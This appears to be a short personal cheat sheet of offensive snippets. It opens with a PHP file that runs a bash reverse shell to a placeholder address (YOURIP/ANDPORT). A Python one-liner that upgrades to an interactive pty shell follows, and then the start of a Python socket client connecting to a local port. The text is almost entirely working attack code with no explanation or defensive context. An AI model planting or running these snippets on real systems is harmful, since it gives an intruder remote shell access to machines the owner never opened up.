#php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/YOURIP/ANDPORT 0>&1 '");
?>

#python ptk shell
python -c 'import pty; pty.spawn("/bin/sh")'

#python connection
#!/bin/python3
import socket
#SOCKETS
HOST = '127.0.0.1'
PORT = 7777

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #af_int is ipv4, sock_stream is a port

s.connect((HOST,PORT))

